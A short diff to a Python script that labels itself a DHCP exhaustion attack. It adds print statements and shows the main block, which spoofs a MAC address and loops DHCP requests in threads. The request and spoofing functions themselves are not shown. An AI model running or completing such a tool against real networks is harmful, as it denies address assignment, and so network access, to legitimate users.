@@ -75,11 +75,14 @@ def dhcpRequest():
 
 
 if __name__ == "__main__":
+    print("Starting DHCP exhaustion attack...")
+
     def dhcpRequest_loop():
         while True:
             dhcpRequest()
             sleep(3)
-    print(spoofMac())
+
+    print(f'Spoofing mac with: {spoofMac()}')
     sniff_thread = threading.Thread(target=sniffer)
     sniff_thread.start()
     dhcp_thread = threading.Thread(target=dhcpRequest_loop)
